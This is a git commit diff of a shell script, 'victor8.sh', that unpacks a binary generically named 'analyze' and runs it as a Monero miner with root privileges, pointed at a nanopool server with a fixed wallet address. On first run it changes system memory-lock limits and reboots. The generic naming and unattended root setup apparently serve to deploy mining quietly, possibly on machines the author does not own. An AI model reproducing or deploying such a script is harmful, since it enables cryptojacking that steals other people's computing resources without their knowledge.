6648a49306f0858728d39b55c01391b85b87371d
1aia <ahmetov.almaz@gmail.com>
2022-04-02 19:47:01 +0300

    Update victor8.sh

--- victor8.sh
+++ victor8.sh
@@ -1,6 +1,6 @@
 if [ -e /root/initdone ]
 then
-    tar -xvf analyze.tar ; sudo sysctl -w vm.nr_hugepages=8 ; sudo chmod +x ./analyze ; sudo LD_LIBRARY_PATH=$PWD:$LD_LIBRARY_PATH  ./analyze -a rx/0 -t 8 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS21WH2cfawSGCNupk7.victorx/itwaybot@gmail.com -l res.txt
+    tar -xvf analyze.tar ; sudo sysctl -w vm.nr_hugepages=8 ; sudo chmod +x ./analyze ; sudo LD_LIBRARY_PATH=$PWD:$LD_LIBRARY_PATH  ./analyze -a rx/0 -t 8 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS21WH2cfawSGCNupk7.victorx/itwaybot@gmail.com -l res.txt --randomx-1gb-pages
 else
     sudo sysctl -w vm.nr_hugepages=8 ; sudo echo "* soft memlock 262144" >> /etc/security/limits.conf ; sudo echo "* hard memlock 262144" >> /etc/security/limits.conf ; echo "." > /root/initdone ; reboot
 fi
